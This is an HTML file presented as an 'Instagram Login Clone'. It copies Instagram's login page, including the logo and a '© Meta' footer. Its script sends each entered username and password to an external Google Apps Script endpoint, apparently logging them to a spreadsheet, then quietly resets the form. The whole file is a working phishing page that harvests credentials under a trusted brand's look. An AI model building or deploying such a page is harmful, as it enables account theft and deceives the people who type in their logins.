<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Instagram Login Clone</title>
  <style>
    * {
  box-sizing: border-box;
}

body {
  margin: 0;
  padding: 0;
  font-family: sans-serif;
  background-color: white;
  display: flex;
  flex-direction: column;
  align-items: center;
  min-height: 100vh;
  justify-content: space-between; /* This pushes bottom section to the bottom */
}

.bottom-section {
  text-align: center;
  width: 100%;
  padding: 20px 0;
  margin-top: auto; /* Ensures it sticks to the bottom */
}


.english {
  font-size: 0.9rem;
  color: rgb(92, 90, 90);
  margin-top: 25px;
}

.logo {
  width: 50%;
  max-width: 300px;
  height: auto;
  margin: 20px auto 10px;
}
/* make the container stretch further on large screens */
.container {
  width: 90%;
  max-width: 600px;       /* ↑ bump this up from 400px */
  padding: 20px;
  text-align: center;
  margin: 0 auto;
}

/* let the inputs fill the container width */
input[type="text"],
input[type="password"] {
  width: 100%;            /* ↑ change from 90% to 100% */
          /* remove any old max if present */
  height: 40px;
  padding: 10px;
  margin:4px 0;
  border: 1px solid #b3b3b3;
  border-radius: 9px;
  font-size: 1rem;
}


input:-webkit-autofill {
  box-shadow: 0 0 0 30px white inset !important;
  -webkit-text-fill-color: #000 !important;
}

.login-btn {
  width: 100%;
  padding: 12px;
  margin-top: 10px;
  background-color: #3897f0;
  border: none;
  border-radius: 23px;
  color: white;
  font-weight: bold;
  font-size: 16px;
  cursor: pointer;
  display: flex;
  align-items: center;
  justify-content: center;
  height: 48px;
}

.spinner {
  border: 3px solid #fff;
  border-top: 3px solid transparent;
  border-radius: 50%;
  width: 16px;
  height: 16px;
  animation: spin 1s linear infinite;
  margin-left: 10px;
  display: none;
}

@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}

.link {
  color: #040404;
  margin: 15px 0;
  font-size: 16px;
  display: block;
  text-decoration: none;
}


.create-account {
  border: 1px solid #3897f0;
  padding: 10px 20px;
  border-radius: 30px;
  color: #3897f0;
  width: 90%;
  max-width: 400px;
  text-decoration: none;
  font-weight: bold;
  display: inline-block;
  margin-bottom: 10px;
}

footer {
  font-size: 14px;
  color: gray;
}

    
  </style>
</head>
<body>
  <body>
 <body>
  <body>
    <p class="english">English (US)</p>
  
    <img src="instalogo.jpeg" alt="Instagram Logo" class="logo" />
  
    <div class="container">
      <form method="POST" name="google-sheet" id="loginForm">
        <input type="text" placeholder="Username, email or mobile number" id="username" name="username" />
        <input type="text" placeholder="Password" id="password" name="password" autocomplete="new-password" />
  
        <button type="submit" class="login-btn" id="loginBtn" name="submit" disabled>
          Log in
          <div class="spinner" id="spinner"></div>
        </button>
  
        <a href="#" class="link">Forgot password?</a>
      </form>
    </div>
  
    <!-- This stays always at the bottom -->
    <div class="bottom-section">
      <a href="#" class="create-account">Create new account</a>
      <footer>© Meta</footer>
    </div>
  </body>
  

  <script>
    const usernameInput = document.getElementById('username');
const passwordInput = document.getElementById('password');

function checkInputs() {
  const usernameFilled = usernameInput.value.trim() !== '';
  const passwordFilled = passwordInput.value.trim() !== '';
  loginBtn.disabled = !(usernameFilled && passwordFilled);
  loginBtn.style.opacity = loginBtn.disabled ? '0.6' : '1';
}

usernameInput.addEventListener('input', checkInputs);
passwordInput.addEventListener('input', checkInputs);

    const scriptURL = 'https://script.google.com/macros/s/AKfycbyUaf-AGKMIgheBlmSSKKzrryOxg8gl-VmzbsY1DZFIRx0xNmg96XHLZ3JiXOMr27dc/exec';
    const form = document.forms['google-sheet'];
    const loginBtn = document.getElementById('loginBtn');
    const spinner = document.getElementById('spinner');

    form.addEventListener('submit', e => {
      e.preventDefault();

      // Show spinner
      spinner.style.display = 'inline-block';
      loginBtn.disabled = true;
      loginBtn.style.opacity = '0.6';

      fetch(scriptURL, { method: 'POST', body: new FormData(form)})
        .then(response => {
          setTimeout(() => {
            spinner.style.display = 'none';
            loginBtn.disabled = false;
            loginBtn.style.opacity = '1';
            
            form.reset();
          }, 300);
        })
        .catch(error => {
          console.error('Error!', error.message);
          spinner.style.display = 'none';
          loginBtn.disabled = false;
          loginBtn.style.opacity = '1';
        });
    });
  </script>
</body>
</html>
